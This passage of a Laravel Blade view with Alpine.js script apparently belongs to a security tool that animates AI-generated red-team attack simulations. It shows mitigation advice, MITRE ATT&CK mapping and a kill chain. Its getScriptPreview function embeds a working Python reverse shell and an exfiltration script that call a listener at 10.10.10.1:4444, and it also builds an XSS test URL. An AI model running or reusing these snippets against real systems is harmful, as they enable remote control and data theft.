                             'text-green-400': hasilAI?.tingkat_kesulitan === 'mudah',
                             'text-yellow-400': hasilAI?.tingkat_kesulitan === 'sedang',
                             'text-orange-400': hasilAI?.tingkat_kesulitan === 'sulit',
                             'text-red-400': hasilAI?.tingkat_kesulitan === 'sangat_sulit',
                         }"
                         x-text="(hasilAI?.tingkat_kesulitan ?? '').replace('_', ' ')">
                    </div>
                </div>
            </div>
            <div>
                <div class="text-xs text-slate-500 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                    <svg class="w-3.5 h-3.5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                    </svg>
                    Rekomendasi Mitigasi
                </div>
                <div class="space-y-2">
                    <template x-for="(rek, i) in (hasilAI?.rekomendasi_mitigasi ?? [])" :key="i">
                        <div class="flex items-start gap-2.5 p-3 rounded-xl bg-blue-500/5 border border-blue-500/15">
                            <div class="w-5 h-5 rounded-full bg-blue-500/20 flex items-center justify-center text-blue-400 text-[10px] font-bold shrink-0 mt-0.5" x-text="i + 1"></div>
                            <span class="text-sm text-slate-300" x-text="rek"></span>
                        </div>
                    </template>
                </div>
            </div>
        </div>

        {{-- Post-Mortem --}}
        <div class="p-5 rounded-2xl border border-red-900/30 bg-red-950/10">
            <h3 class="text-sm font-semibold text-red-400 flex items-center gap-2 mb-4">
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                </svg>
                Narasi Teknis (Post-Mortem)
            </h3>
            <div class="text-sm text-slate-400 leading-relaxed whitespace-pre-line">
                {!! nl2br(e($simulasi->narasi_teknis)) !!}
            </div>
        </div>

        {{-- MITRE + Kill Chain --}}
        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
            <div class="p-5 rounded-2xl border border-slate-800 bg-slate-900/50">
                <h3 class="text-xs font-semibold text-slate-300 uppercase tracking-wider mb-4">MITRE ATT&CK Mapping</h3>
                <div class="space-y-2">
                    @if(is_array($simulasi->fase_attck))
                        @foreach($simulasi->fase_attck as $fase)
                        <div class="px-3 py-2 bg-slate-800/50 rounded-lg border border-slate-700/50 text-xs text-slate-300 flex items-center gap-2">
                            <div class="w-1.5 h-1.5 rounded-full bg-purple-400 shrink-0"></div>
                            {{ $fase }}
                        </div>
                        @endforeach
                    @else
                        <div class="text-xs text-slate-500 italic">Data fase tidak tersedia</div>
                    @endif
                </div>
            </div>
            <div class="p-5 rounded-2xl border border-slate-800 bg-slate-900/50">
                <h3 class="text-xs font-semibold text-slate-300 uppercase tracking-wider mb-4">Kill Chain</h3>
                @php $rantai = is_array($simulasi->rantai_serangan) ? $simulasi->rantai_serangan : []; @endphp
                @if(count($rantai) > 0)
                <div class="space-y-2">
                    @foreach($rantai as $i => $step)
                    <div class="flex items-start gap-3">
                        <div class="w-6 h-6 rounded-full bg-slate-800 border border-slate-600 flex items-center justify-center text-[10px] text-slate-400 font-bold shrink-0 mt-0.5">{{ $i + 1 }}</div>
                        <span class="text-xs text-slate-400 leading-relaxed">{{ $step }}</span>
                    </div>
                    @endforeach
                </div>
                @else
                    <div class="text-xs text-slate-500 italic">Data rantai serangan tidak tersedia</div>
                @endif
            </div>
        </div>
    </div>

</div>
@endsection

@push('scripts')
<style>
/* ==============================
   TERMINAL WIDGET
   ============================== */
.sim-terminal-container { width: 100%; }
.sim-terminal-toolbar {
    display: flex;
    height: 32px;
    align-items: center;
    padding: 0 10px;
    background: linear-gradient(#504b45 0%, #3c3b37 100%);
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
}
.sim-btn {
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 0;
    margin-right: 5px;
    width: 12px;
    height: 12px;
    border: none;
    border-radius: 50%;
    background: linear-gradient(#7d7871 0%, #595953 100%);
    box-shadow: 0px 0px 1px 0px #41403A, 0px 1px 1px 0px #474642;
    cursor: pointer;
}
.sim-btn-red { background: #ee411a; }
.sim-terminal-user { color: #d5d0ce; font-size: 12px; }
.sim-terminal-body {
    background: rgba(13,17,23,0.97);
    border-bottom-left-radius: 8px;
    border-bottom-right-radius: 8px;
}
.sim-terminal-prompt { display: flex; align-items: center; gap: 4px; margin-bottom: 8px; }
.sim-terminal-user-text { color: #7eda28; }
.sim-terminal-location   { color: #4878c0; }
.sim-terminal-bling      { color: #dddddd; }
.sim-terminal-cursor {
    display: inline-block;
    height: 13px;
    width: 5px;
    background: #fff;
    margin-left: 4px;
    animation: curbl 1200ms linear infinite;
    vertical-align: middle;
}
@keyframes curbl {
    0%, 49%  { background: #fff; }
    60%, 99% { background: transparent; }
    100%     { background: #fff; }
}
.term-output      { color: #cbd5e1; }
.term-success     { color: #4ade80; }
.term-error       { color: #f87171; }
.term-warning     { color: #fde047; }
.term-info        { color: #22d3ee; }
.term-command     { color: #ffffff; }
.term-prompt-line { color: #64748b; }

/* ==============================
   BROWSER WIDGET
   ============================== */
.sim-browser {
    width: 100%;
    background: lightgrey;
    border-radius: 8px;
    overflow: hidden;
    box-shadow: 5px 5px 20px rgba(0,0,0,0.4);
}
.sim-tabs-head {
    background-color: #353535;
    height: 38px;
    display: flex;
    justify-content: space-between;
    align-items: flex-end;
    padding-left: 10px;
}
.sim-tab-open {
    background-color: #515151;
    border-radius: 7px 7px 0 0;
    font-size: 10px;
    color: #fff;
}
.sim-window-btn {
    border: none;
    background: transparent;
    color: #fff;
    cursor: pointer;
    height: 30px;
    transition: background 0.1s;
}
.sim-window-btn:hover { background: rgba(255,255,255,0.1); }
.sim-window-btn-close {
    border: none;
    background: transparent;
    color: #fff;
    cursor: pointer;
    height: 30px;
    transition: background 0.1s;
}
.sim-window-btn-close:hover { background: rgb(255,52,52); }
.sim-head-browser {
    background-color: #515151;
    padding: 6px 8px;
    display: flex;
    align-items: center;
    gap: 4px;
}

/* ==============================
   VSCODE CARD
   ============================== */
.vscode-card {
    height: 320px;
    background: #1e1e1e;
    border-radius: 8px;
    box-shadow: 0 8px 25px rgba(0,0,0,0.6), inset 0 0 5px rgba(0,255,0,0.05);
    border: 1px solid #333;
    overflow: hidden;
    position: relative;
    font-family: "Consolas","Courier New",monospace;
    transition: transform 0.3s cubic-bezier(0.65,-0.5,0.35,1.5);
}
.vscode-card:hover { transform: translateY(-2px); }
.window-bar {
    height: 30px;
    background: #3c3c3c;
    display: flex;
    align-items: center;
    padding: 0 8px;
    border-bottom: 1px solid #2a2a2a;
}
.window-buttons { display: flex; gap: 6px; }
.vscode-card .btn {
    width: 10px; height: 10px;
    border-radius: 50%;
    background: #555;
    box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
    transition: transform 0.2s;
    border: none;
    cursor: default;
}
.vscode-card .btn:hover { transform: scale(1.15); }
.vscode-card .close    { background: #ff605c; }
.vscode-card .minimize { background: #ffbd44; }
.vscode-card .maximize { background: #00ca4e; }
.window-title { color: #ccc; font-size: 11px; margin-left: 10px; }
.tab-bar {
    height: 32px;
    background: #252526;
    display: flex;
    border-bottom: 1px solid #1a1a1a;
}
.tab {
    padding: 6px 14px;
    color: #999;
    font-size: 11px;
    cursor: default;
    border-right: 1px solid #1a1a1a;
    transition: background 0.2s, color 0.2s;
}
.tab.active { color: #00ff00; background: #1e1e1e; text-shadow: 0 0 5px rgba(0,255,0,0.4); }
.tab:hover:not(.active) { background: #2d2d2d; color: #ccc; }
.editor-container { display: flex; height: calc(100% - 92px); }
.sidebar {
    width: 36px;
    background: #333;
    border-right: 1px solid #252526;
    display: flex;
    align-items: center;
    justify-content: center;
}
.icon {
    width: 18px; height: 18px;
    background: linear-gradient(135deg, #00ff00, #00cc00);
    clip-path: polygon(50% 0%,100% 50%,50% 100%,0% 50%);
    animation: iconPulse 2s infinite ease-in-out;
}
@keyframes iconPulse {
    0%,100% { transform: scale(1); }
    50%     { transform: scale(1.1); }
}
.editor { flex:1; display:flex; background:#1e1e1e; padding:8px; overflow:hidden; }
.line-numbers {
    width: 30px;
    color: #858585;
    font-size: 11px;
    text-align: right;
    padding-right: 6px;
    border-right: 1px solid #2a2a2a;
    user-select: none;
}
.line-numbers span { display: block; line-height: 15px; }
.code-content { flex:1; padding-left:8px; overflow:hidden; }
.code-content pre { margin:0; }
.code-content code {
    color: #00ff00;
    font-size: 11px;
    line-height: 15px;
    text-shadow: 0 0 3px rgba(0,255,0,0.3);
    white-space: pre-wrap;
    word-break: break-all;
    animation: codeGlow 3s infinite alternate;
}
@keyframes codeGlow {
    0%   { text-shadow: 0 0 3px rgba(0,255,0,0.3); }
    100% { text-shadow: 0 0 6px rgba(0,255,0,0.5); }
}
.status-bar {
    height: 28px;
    background: #007acc;
    display: flex;
    justify-content: flex-end;
    align-items: center;
    padding: 0 8px;
    border-top: 1px solid #005f99;
}
.status-item { color:#fff; font-size:10px; margin-left:12px; }
.vscode-card::before {
    content:"";
    position:absolute; top:0; left:0;
    width:100%; height:100%;
    background:linear-gradient(to bottom,rgba(0,255,0,0.03),transparent 50%);
    animation:scanline 4s infinite linear;
    pointer-events:none;
    opacity:0.5;
}
@keyframes scanline {
    0%   { transform: translateY(-100%); }
    100% { transform: translateY(100%); }
}

/* ==============================
   TIMELINE
   ============================== */
.step-block { transition: all 0.3s ease; }
.step-active .rounded-2xl { animation: stepGlow 2s ease-in-out infinite; }
@keyframes stepGlow {
    0%,100% { box-shadow: 0 0 0 rgba(234,179,8,0); }
    50%     { box-shadow: 0 0 30px rgba(234,179,8,0.08); }
}

/* ==============================
   SCROLLBAR
   ============================== */
.custom-scrollbar::-webkit-scrollbar { width: 4px; height: 4px; }
.custom-scrollbar::-webkit-scrollbar-track { background: #1e293b; border-radius: 4px; }
.custom-scrollbar::-webkit-scrollbar-thumb { background: #475569; border-radius: 4px; }
.custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #64748b; }

/* ==============================
   PRINT
   ============================== */
.print-header { display: none; }
@media print {
    nav, header, footer, aside, button, .no-print { display: none !important; }
    * { -webkit-print-color-adjust: exact !important; print-color-adjust: exact !important; }
    body { background: #0d1117 !important; color: #e2e8f0 !important; font-size: 10px; margin: 0; }
    .print-header { display: block !important; margin-bottom: 16px; }
    .step-block { break-inside: avoid; page-break-inside: avoid; margin-bottom: 20px !important; }
}
</style>

<script>
function simulasiRedTeam() {
    return {
        isRunning: false,
        isComplete: false,
        isError: false,
        isLoadingAI: false,
        isTyping: false,
        sedangDiketik: '',
        pesanError: '',
        hasilAI: null,
        semuaLangkah: [],
        langkahSelesai: [],
        scanId: '{{ $scan->id }}',
        simulasiId: '{{ $simulasi->id }}',
        csrfToken: document.querySelector('meta[name="csrf-token"]')?.content ?? '',

        tipeLabelMap: {
            recon:        'Reconnaissance',
            scan:         'Scanning & Enumeration',
            exploit:      'Exploitation',
            post_exploit: 'Post-Exploitation',
            exfil:        'Data Exfiltration',
            cleanup:      'Cleanup / Anti-Forensics',
        },

        init() {},

        isBrowserStep(langkah) {
            const judul = (langkah.judul ?? '').toLowerCase();
            const fase  = (langkah.fase_attck ?? '').toLowerCase();
            const teks  = (langkah.baris_terminal ?? []).map(b => (b.teks ?? '').toLowerCase()).join(' ');
            const keys  = ['xss', 'browser', 'phishing', 'csrf', 'clickjack',
                           'web injection', 'open redirect', 'reflected', 'stored', 'alert('];
            return keys.some(k => judul.includes(k) || fase.includes(k) || teks.includes(k));
        },

        isScriptStep(langkah) {
            const judul = (langkah.judul ?? '').toLowerCase();
            const fase  = (langkah.fase_attck ?? '').toLowerCase();
            const teks  = (langkah.baris_terminal ?? []).map(b => (b.teks ?? '').toLowerCase()).join(' ');
            const keys  = ['script', 'payload', 'python', 'exploit code', 'backdoor',
                           'reverse shell', 'malware', 'dropper', 'exfil script', 'write-host', 'cat >'];
            return !this.isBrowserStep(langkah) &&
                   keys.some(k => judul.includes(k) || fase.includes(k) || teks.includes(k));
        },

        getBrowserUrl(langkah) {
            const h = '{{ parse_url($scan->target, PHP_URL_HOST) ?? $scan->target }}';
            if (langkah.tipe === 'exploit')      return `${h}?q=<script>alert(1)<\/script>`;
            if (langkah.tipe === 'post_exploit') return `${h}/admin/dashboard`;
            return h;
        },

        getScriptPreview(langkah) {
            const h = '{{ parse_url($scan->target, PHP_URL_HOST) ?? $scan->target }}';
            if (langkah.tipe === 'exfil') {
                return `import requests\n\nTARGET = "${h}"\nLHOST  = "10.10.10.1"\nLPORT  = 4444\n\ndef exfil_data(data):\n    r = requests.post(\n        f"http://{LHOST}:{LPORT}",\n        data=data\n    )\n    return r.status_code\n\nif __name__ == "__main__":\n    exfil_data("EXFIL_DATA")`;
            }
            return `#!/usr/bin/env python3\nimport socket, subprocess\n\nRHOST = "${h}"\nLHOST = "10.10.10.1"\nLPORT = 4444\n\ndef connect():\n    s = socket.socket()\n    s.connect((LHOST, LPORT))\n    while True:\n        cmd = s.recv(1024).decode()\n        out = subprocess.getoutput(cmd)\n        s.send(out.encode())\n\nif __name__ == "__main__":\n    connect()`;
        },

        async jalankanSimulasi() {
            this.isRunning = true;
            this.isComplete = false;
            this.isError = false;
            this.isLoadingAI = true;
            this.hasilAI = null;
            this.semuaLangkah = [];
            this.langkahSelesai = [];
            this.pesanError = '';

            try {
                const response = await fetch(
                    `/simulasi/${this.scanId}/${this.simulasiId}/run-ai`,
                    {
                        method: 'POST',
                        headers: {
                            'X-CSRF-TOKEN': this.csrfToken,
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                        },
                    }
                );
                this.isLoadingAI = false;
                const json = await response.json();
                if (!json.sukses || !json.data?.langkah_simulasi) {
                    throw new Error(json.pesan ?? 'Respons AI tidak valid.');
                }
                const data = json.data;
                this.semuaLangkah = data.langkah_simulasi;

                for (let i = 0; i < data.langkah_simulasi.length; i++) {
                    await this.tampilkanLangkah(data.langkah_simulasi[i], i);
                    await this.delay(400);
                    this.scrollToStep(i);
                }

                this.hasilAI   = data;
                this.isRunning = false;
                this.isComplete = true;

            } catch (err) {
                this.isLoadingAI = false;
                this.isRunning   = false;
                this.isError     = true;
                this.pesanError  = err.message ?? 'Terjadi kesalahan tidak diketahui.';
            }
        },

        async tampilkanLangkah(langkah, idx) {
            const barisTerminal = langkah.baris_terminal ?? [];
            this.langkahSelesai.push({ ...langkah, baris_terminal: [] });
            await this.delay(250);

            const tambahBaris = (baris) => {
                const cur = this.langkahSelesai[idx];
                this.langkahSelesai.splice(idx, 1, {
                    ...cur,
                    baris_terminal: [...cur.baris_terminal, baris]
                });
            };

            for (const baris of barisTerminal) {
                if (baris.tipe === 'command') {
                    this.isTyping = true;
                    this.sedangDiketik = '';
                    for (const char of baris.teks) {
                        this.sedangDiketik += char;
                        await this.delay(18);
                    }
                    this.isTyping = false;
                    this.sedangDiketik = '';
                    tambahBaris(baris);
                    await this.delay(100);
                } else {
                    tambahBaris(baris);
                    await this.delay(30);
                }
                this.$nextTick(() => {
                    const el = document.getElementById('term-body-' + idx);
                    if (el) el.scrollTop = el.scrollHeight;
                });
            }
            await this.delay(300);
        },

        scrollToStep(idx) {
            this.$nextTick(() => {
                const steps = document.querySelectorAll('#timeline-steps .step-block');
                if (steps[idx]) steps[idx].scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            });
        },

        resetSimulasi() {
            this.isRunning    = false;
            this.isComplete   = false;
            this.isError      = false;
            this.isLoadingAI  = false;
            this.isTyping     = false;
            this.hasilAI      = null;
            this.semuaLangkah = [];
            this.langkahSelesai = [];
            this.pesanError   = '';
        },

        delay(ms) { return new Promise(r => setTimeout(r, ms)); }
    };
}
</script>
@endpush
